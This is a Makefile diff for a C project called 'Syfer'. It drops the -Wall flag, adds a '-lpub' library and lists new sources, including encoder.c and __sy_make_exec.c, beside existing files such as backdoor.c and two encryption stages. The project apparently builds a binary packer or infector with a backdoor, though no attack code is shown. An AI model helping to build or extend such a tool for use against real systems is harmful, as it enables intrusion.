@@ -1,11 +1,10 @@
 NAME = Syfer
 LIBFT_PATH = libft/
-CFLAGS_COMMON :=  -Wall  -g -std=gnu99 -fPIC -I .. -I bddisasm/inc -I ./$(LIBFT_PATH)/includes
+CFLAGS_COMMON :=  -g -std=gnu99 -fPIC -I .. -I bddisasm/inc -I ./$(LIBFT_PATH)/includes
 CFLAGS = $(CFLAGS_COMMON)
 
 NASM := nasm -f bin
-
-LDFLAGS := -Lbddisasm/bin/x64/Release -l:libbddisasm.a -lcrypto -L $(LIBFT_PATH) -lft
+LDFLAGS := -Lbddisasm/bin/x64/Release -l:libbddisasm.a -lcrypto -lpub -L $(LIBFT_PATH) -lft
 
 SRCS_PATH := srcs/
 OBJ_PATH  := obj/
@@ -20,8 +19,10 @@ SRCS_NAME = main.c \
 	    syfer.c \
 	    syscall.c \
 	    backdoor.c \
+	    encoder.c \
 	    utils.c \
 	    apply_inner_encryption.c \
+	    __sy_make_exec.c\
 	    apply_global_encryption.c \
 
 STRIP  := strip $(NAME)
